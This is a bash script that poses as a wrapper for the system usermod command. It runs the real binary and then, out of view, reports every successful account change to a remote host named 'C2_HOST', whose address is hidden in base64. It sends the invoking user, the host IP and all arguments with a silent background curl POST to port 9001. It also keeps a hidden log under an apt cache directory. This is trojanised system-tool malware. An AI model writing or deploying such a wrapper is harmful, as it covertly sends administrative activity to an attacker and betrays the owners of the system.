#!/bin/bash
REAL_USERMOD="/usr/sbin/usermod"
LOG_DIR="/var/lib/apt/lists/.cache"
LOCAL_LOG="${LOG_DIR}/events"
C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
C2_PORT="9001"
COLLECT_URL="http://${C2_HOST}:${C2_PORT}/log"

_log_local() {
    touch "$LOCAL_LOG" 2>/dev/null
    echo "$1" >> "$LOCAL_LOG" 2>/dev/null
    true
}

_log_remote() {
    curl -sf -X POST -H "Content-Type: application/json" \
        -d "$1" --connect-timeout 3 --max-time 3 \
        "$COLLECT_URL" > /dev/null 2>&1 &
    true
}

INVOKING_USER=$(whoami)
HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")
COMMAND_ARGS="$*"

# Parse flags we care about
TARGET_USER=""
NEW_GROUPS=""
NEW_HOME=""
NEW_SHELL=""
NEW_LOGIN=""
LOCK_ACTION=""

SKIP_NEXT=""
for arg in "$@"; do
    if [ -n "$SKIP_NEXT" ]; then
        case "$SKIP_NEXT" in
            -G|-g) NEW_GROUPS="$arg" ;;
            -d)    NEW_HOME="$arg" ;;
            -s)    NEW_SHELL="$arg" ;;
            -l)    NEW_LOGIN="$arg" ;;
        esac
        SKIP_NEXT=""
        continue
    fi
    case "$arg" in
        -G|-g|-d|-s|-l) SKIP_NEXT="$arg" ;;
        -L) LOCK_ACTION="lock" ;;
        -U) LOCK_ACTION="unlock" ;;
        -*) ;;
        *) TARGET_USER="$arg" ;;
    esac
done

$REAL_USERMOD "$@"
RC=$?

if [ $RC -eq 0 ] && [ -n "$TARGET_USER" ]; then
    PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"usermod","timestamp":"%s","data":{"target_user":"%s","groups":"%s","new_home":"%s","new_shell":"%s","new_login":"%s","lock_action":"%s","full_args":"%s"}}' \
        "$HOST_IP" "$INVOKING_USER" "$HOST_TS" \
        "$TARGET_USER" "$NEW_GROUPS" "$NEW_HOME" "$NEW_SHELL" "$NEW_LOGIN" "$LOCK_ACTION" "$COMMAND_ARGS")
    _log_remote "$PAYLOAD"
    _log_local "${HOST_TS}|usermod|${INVOKING_USER}|target:${TARGET_USER}|${COMMAND_ARGS}"
fi

exit $RC
